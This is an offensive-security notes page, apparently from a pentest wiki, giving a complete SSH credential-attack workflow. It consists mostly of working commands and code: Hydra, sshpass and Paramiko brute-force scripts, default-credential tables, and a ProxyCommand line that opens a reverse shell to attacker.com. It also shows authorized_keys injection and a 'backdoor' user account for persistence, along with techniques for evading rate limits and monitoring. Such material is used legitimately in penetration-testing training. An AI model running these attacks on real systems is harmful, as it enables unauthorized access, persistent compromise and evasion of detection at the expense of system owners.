#enumeration #exploitation

SSH brute forcing and credential-based attacks on SSH services. SSH is a common entry point — weak passwords, default credentials, and key misconfigurations are frequent vulnerabilities.

## Identify SSH services

**From nmap:**
```bash
nmap -p 22,2222,2222 -sV target.com
```

Look for: SSH service, version (OpenSSH X.X).

**On non-standard ports:**
```bash
nmap -p- target.com | grep -i ssh
# or search common SSH ports: 22, 2022, 2222, 22222
```

---

## Tool 1: Hydra (Fast, parallel)

### Basic SSH brute force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
```

**Flags:**
- `-l root` — single username
- `-L users.txt` — username list
- `-p password` — single password
- `-P rockyou.txt` — password wordlist
- `-C creds.txt` — username:password pairs
- `-t 4` — 4 parallel threads (default 16; reduce to avoid detection)
- `-w 5` — 5 second delay between attempts (evade rate limiting)
- `-f` — exit after first valid credential found

### With non-standard port
```bash
hydra -l admin -P passwords.txt -p 2222 ssh://target.com
```

### Against multiple targets
```bash
hydra -l root -P rockyou.txt -M targets.txt ssh
# targets.txt contains one IP per line
```

### Verbose output (see each attempt)
```bash
hydra -l root -P rockyou.txt -v ssh://target.com
```

**Output example:**
```
[22][ssh] host: target.com   login: root   password: toor
```

---

## Tool 2: sshpass (Automated login)

Once credentials are found, use `sshpass` to automatically log in without prompts:

```bash
sshpass -p 'password123' ssh -o StrictHostKeyChecking=no user@target.com
```

**Flags:**
- `-p 'password'` — password (in quotes if contains special chars)
- `-f file` — read password from file
- `-e` — read password from environment variable
- `-StrictHostKeyChecking=no` — skip host key verification (trust first connection)
- `-P askpass` — prompt for password securely

**Example: Connect and run command**
```bash
sshpass -p 'password123' ssh user@target.com "cat /etc/passwd"
```

**Example: Scripted loop (brute force alternative)**
```bash
for pass in $(cat passwords.txt); do
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no user@target.com exit
  if [ $? -eq 0 ]; then
    echo "Found: $pass"
    break
  fi
done
```

---

## Tool 3: Paramiko (Custom Python)

For custom authentication logic or when Hydra isn't sufficient:

```python
import paramiko

def ssh_brute_force(host, username, passwords):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in passwords:
        try:
            ssh.connect(host, username=username, password=password, timeout=5)
            print(f"[+] Found: {username}:{password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return False

# Usage
passwords = ["password", "123456", "admin", "root"]
ssh_brute_force("target.com", "admin", passwords)
```

**Advantages:**
- Custom retry logic
- Per-password timing
- Parse server responses
- Post-authentication commands

---

## SSH Key-Based Attacks

### Test common/default keys
```bash
# Try root/.ssh/id_rsa with empty passphrase
ssh -i /path/to/key -o PasswordAuthentication=no root@target.com

# Try common key paths
for key in id_rsa id_dsa id_ecdsa; do
  if [ -f ~/.ssh/$key ]; then
    ssh -i ~/.ssh/$key root@target.com exit
    [ $? -eq 0 ] && echo "Valid key: $key" && break
  fi
done
```

### Wordlist of weak/public keys
```bash
# Clone common weak SSH keys
git clone https://github.com/rapid7/ssh-default-keys.git

# Test each
for keyfile in ssh-default-keys/*.pem; do
  ssh -i "$keyfile" -o StrictHostKeyChecking=no root@target.com exit
  [ $? -eq 0 ] && echo "Valid: $keyfile"
done
```

### Crack key passphrase (if you have the key)
```bash
# Extract hash from private key
ssh2john.py id_rsa > hash.txt

# Crack with John
john --wordlist=rockyou.txt hash.txt
```

---

## SSH Config Exploits

### ProxyCommand injection
If SSH config allows `ProxyCommand`, you might execute arbitrary code:

```bash
# Check if config is writable or includes untrusted files
cat ~/.ssh/config
# Look for: ProxyCommand, ProxyUseFdpass, StrictHostKeyChecking=no

# Inject command execution
echo "Host target" >> ~/.ssh/config
echo "  ProxyCommand /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> ~/.ssh/config
ssh target
```

### StrictHostKeyChecking=no
If this is set globally, you can MITM the connection:

```bash
# Set up proxy
ssh -o StrictHostKeyChecking=no user@target.com
# No warning about unknown host key — vulnerable to MITM
```

### authorized_keys injection (Post-compromise)
Once you have shell access, inject your public key for persistence:

```bash
# On compromised machine
echo "ssh-rsa AAAA... attacker@home" >> ~/.ssh/authorized_keys

# From attacker machine, no password needed
ssh user@target.com
```

---

## Rate Limiting & Detection Evasion

### Detect rate limiting
```bash
# SSH servers often close connection after N failed attempts
ssh -v user@target.com 2>&1 | grep -i "disconnect\|closed\|timeout"

# Some servers lock accounts after failed attempts
# Watch for: "Account locked" or "Too many authentication failures"
```

### Evasion techniques

| Technique | How | Benefit |
| --- | --- | --- |
| **Slow down** | `hydra -w 10` (10s delay) | Avoid detection, account lockout |
| **Randomize** | Random delay between 5-15s | Looks more human |
| **Per-user delay** | Different delay per username | Distribute load |
| **IP rotation** | Use proxy list, VPN | Bypass IP-based rate limiting |
| **Connection pooling** | Keep 1 connection open | Fewer "new connection" logs |
| **Target different users** | Cycle through username list | If one locks, try another |
| **Off-peak timing** | Brute force at night | Lower monitoring |

### Hydra with evasion
```bash
# Slow, distributed attack
hydra -l admin -P rockyou.txt -t 1 -w 15 -W 30 ssh://target.com
# -t 1 = 1 thread (slow)
# -w 15 = 15s wait between attempts
# -W 30 = 30s wait between retries
```

### sshpass with delays
```bash
for pass in $(cat passwords.txt); do
  sshpass -p "$pass" ssh -o ConnectTimeout=2 user@target.com exit 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Found: $pass"
    break
  fi
  sleep 10  # 10s delay between attempts
done
```

---

## Non-standard ports

### Find SSH on unusual ports
```bash
nmap -p 1-65535 --open target.com | grep ssh
# or
nmap -p 1-10000 target.com | grep 22

# Test specific ports
for port in 22 222 2022 2222 22222; do
  ssh -p $port user@target.com exit 2>/dev/null
  [ $? -eq 0 ] && echo "SSH found on port $port"
done
```

### Hydra on non-standard port
```bash
hydra -l root -P rockyou.txt ssh://target.com:2222
```

---

## Common default credentials

| Service | Username | Password |
| --- | --- | --- |
| Linux (root) | root | root, password, 123456, toor |
| Linux (user) | ubuntu, debian, admin | ubuntu, password, (blank) |
| Raspberry Pi | pi | raspberry |
| RouterOS | admin | (blank) |
| Cisco | admin | admin, cisco |
| Ubiquiti | ubnt | ubnt |
| QNAP NAS | admin | admin, qnap |

Test these first before wordlist attacks.

---

## Complete attack workflow

### Step 1: Enumerate SSH
```bash
nmap -p 22 -sV target.com
# Identify version, non-standard ports
```

### Step 2: Test defaults
```bash
sshpass -p 'root' ssh -o StrictHostKeyChecking=no root@target.com exit
sshpass -p 'password' ssh admin@target.com exit
```

### Step 3: Brute force with Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 ssh://target.com
```

### Step 4: Verify and exploit
```bash
# Once credentials found
sshpass -p 'found_password' ssh root@target.com
id
whoami
```

### Step 5: Post-compromise
```bash
# Add your SSH key for persistence
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Or create new user
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
```

---

## Tools needed

- **Hydra** — parallel brute forcing
- **sshpass** — automated password entry
- **Paramiko** — Python SSH library
- **ssh-keygen** — key generation and analysis
- **ssh2john** — convert SSH keys to hashable format
- **John/Hashcat** — key passphrase cracking
- **nmap** — service discovery
- **Wordlists** — rockyou.txt, custom lists

---

**See also:**
- [[Web Login Brute Force]] — similar techniques for HTTP
- [[Kerbrute]] — Kerberos authentication attacks (Active Directory)
- [[File Transfer]] — getting files after SSH access
- [[Credential Dumping]] — extracting credentials from compromised systems
